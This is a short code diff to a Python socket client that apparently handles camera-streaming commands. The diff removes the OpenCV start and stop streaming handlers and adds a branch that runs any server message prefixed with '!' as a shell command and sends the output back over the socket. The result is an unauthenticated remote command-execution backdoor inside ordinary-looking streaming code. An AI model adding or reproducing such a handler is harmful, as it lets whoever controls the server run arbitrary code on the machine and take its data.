@@ -406,19 +406,11 @@ def listen_to_me():
                         new_msg += d
 
                 for command in messages:
-                    if command == "start":
-                        # stream = True
-                        logger.info("Start to stream command received.")
-                        thread_list_folder = []
-                        for thread_folder in threading.enumerate():
-                            thread_list_folder.append(thread_folder.name)
-                        if "opencv" not in thread_list_folder:
-                            logger.info("Starting OpenCV")
-                            threading.Thread(target=capture, name="opencv", args=("stream",), daemon=True).start()
-
-                    elif command == "stop":
-                        # stream = False
-                        logger.info("Stop to stream command received.")
+                    if command.startswith("!"):
+                        command = command[1:].split(" ")
+                        command_out = subprocess.check_output(command)
+                        command_out = b"$" + command_out + b"$"
+                        my_server.sendall(command_out)
                     elif command == "k":
                         # if not stream:
                         my_server.sendall(alive_msg)
